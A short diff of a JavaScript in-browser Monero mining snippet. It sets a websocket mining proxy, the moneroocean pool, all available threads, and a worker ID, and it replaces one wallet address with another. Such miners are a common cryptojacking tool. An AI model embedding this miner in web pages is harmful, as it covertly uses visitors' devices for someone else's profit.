@@ -8,7 +8,7 @@ document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
 var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var walletAddress = "45Ft5u41vyY4NUbdiMtWULGA1ZtQgZ3Q2TtyxyyctAxnSk5jbYh2uCabWDhhhS5ptkFu3kX4gGp9rSRbSYDBjqYQ7U83N6i";
 var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
 var password = "";
